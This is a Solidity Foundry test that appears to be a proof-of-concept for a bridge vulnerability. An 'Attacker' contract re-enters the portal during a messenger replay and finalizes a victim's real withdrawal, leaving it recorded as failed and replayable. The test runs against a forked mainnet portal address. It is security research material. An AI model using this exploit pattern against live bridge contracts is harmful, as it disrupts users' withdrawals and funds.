// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./U21Fixtures.sol";

/// @notice Finalizing a victim's REAL messenger withdrawal from INSIDE an L1CDM replay.
///         The portal's l2Sender guard is not engaged during a replay (the replay does not go
///         through the portal), but the messenger's own xDomainMsgSender is set, so the victim's
///         message is recorded in failedMessages at ANY gas and must be replayed.
///         Same behaviour on v8 and v9 (run with U21_FORK=l1pre / l1).
///
///         HARNESS-ONLY part: the ATTACKER's own failed message is injected with vm.store
///         (provenWithdrawals entry for the attacker's withdrawal against a real valid game).
///         In production the attacker simply sends that message from L2 himself; it is his own
///         message to his own contract, so no privilege is modelled. The victim side is a real
///         fixture driven through public functions only.
contract Attacker {
    IPortal constant PORTAL = IPortal(0xbEb5Fc579115071764c7423A4f12eDde41f106Ed);
    bytes public victimFinalize;
    bool public armed;
    bool public nestedOk;
    bytes public nestedRet;

    function arm(bytes calldata cd) external {
        victimFinalize = cd;
        armed = true;
    }

    fallback() external payable {
        require(armed, "not armed"); // first delivery fails => attacker's message becomes replayable
        (nestedOk, nestedRet) = address(PORTAL).call(victimFinalize);
    }
}

contract NestedReplayTest is U21FixtureBase {
    string internal fork;
    Fixture internal victim;
    Attacker internal attacker;
    WithdrawalTransaction internal awd;
    address internal constant SUB = address(0x5B17);

    function setUp() public {
        fork = vm.envOr("U21_FORK", string("l1"));
        vm.createSelectFork(fork);
        Fixture memory f = _findFixture("pre_mature_valid", true, true);
        PORTAL.checkWithdrawal(f.hash, f.proofSubmitter); // finalizable at the pin, no setup
        victim.hash = f.hash;
        victim.wd = f.wd;
        victim.proofSubmitter = f.proofSubmitter;
        victim.game = f.game;

        attacker = new Attacker();
        // attacker's own L2->L1 message (injected, see header)
        awd.nonce = (uint256(1) << 240) | 0xa77ac4;
        awd.sender = L2CDM;
        awd.target = address(L1CDM);
        awd.value = 0;
        awd.data = abi.encodeCall(
            IMessenger.relayMessage, ((uint256(1) << 240) | 0xa77ac4, address(0xA77), address(attacker), 0, 0, bytes(""))
        );
        awd.gasLimit = 310_160;
        bytes32 h = hashWithdrawal(awd);
        bytes32 slot = keccak256(abi.encode(SUB, keccak256(abi.encode(h, uint256(57)))));
        vm.store(address(PORTAL), slot, bytes32((uint256(IGame(f.game).createdAt() + 1) << 160) | uint256(uint160(f.game))));
    }

    function test_nested_finalize_inside_replay_forces_failed_state() public {
        Inner memory vm_ = decodeInner(victim.wd);
        bytes32 vh = messageHash(victim.wd);
        bytes32 ah = keccak256(awd.data);
        uint256 lb0 = address(LOCKBOX).balance;
        uint256 cdm0 = address(L1CDM).balance;

        // 1. attacker finalizes his own message; his target reverts => failedMessages[ah]
        PORTAL.finalizeWithdrawalTransactionExternalProof(awd, SUB);
        assertTrue(L1CDM.failedMessages(ah), "attacker message recorded as failed");

        // 2. attacker replays it; inside, his target finalizes the VICTIM's withdrawal with ample gas
        attacker.arm(abi.encodeCall(IPortal.finalizeWithdrawalTransactionExternalProof, (victim.wd, victim.proofSubmitter)));
        L1CDM.relayMessage((uint256(1) << 240) | 0xa77ac4, address(0xA77), address(attacker), 0, 0, bytes(""));
        assertTrue(attacker.nestedOk(), "nested finalize of the victim succeeded");

        // 3. victim: finalized on the portal, but only recorded as FAILED in the messenger
        assertTrue(PORTAL.finalizedWithdrawals(victim.hash), "victim finalized");
        assertFalse(L1CDM.successfulMessages(vh), "victim NOT delivered");
        assertTrue(L1CDM.failedMessages(vh), "victim recorded as failed (replayable)");
        assertEq(lb0 - address(LOCKBOX).balance, victim.wd.value, "lockbox paid out");
        assertEq(address(L1CDM).balance - cdm0, victim.wd.value, "value parked in the messenger");
        assertEq(address(PORTAL).balance, 0);

        // 4. anyone replays the victim's message: delivered exactly once, messenger drained
        vm.prank(address(0xCAFE), address(0xCAFE));
        L1CDM.relayMessage(vm_.nonce, vm_.sender, vm_.target, vm_.value, vm_.minGasLimit, vm_.message);
        assertTrue(L1CDM.successfulMessages(vh), "victim delivered by replay");
        assertEq(address(L1CDM).balance, cdm0, "messenger back to its initial balance");
        vm.expectRevert();
        L1CDM.relayMessage(vm_.nonce, vm_.sender, vm_.target, vm_.value, vm_.minGasLimit, vm_.message);
        vm.expectRevert();
        PORTAL.finalizeWithdrawalTransactionExternalProof(victim.wd, victim.proofSubmitter);
    }
}
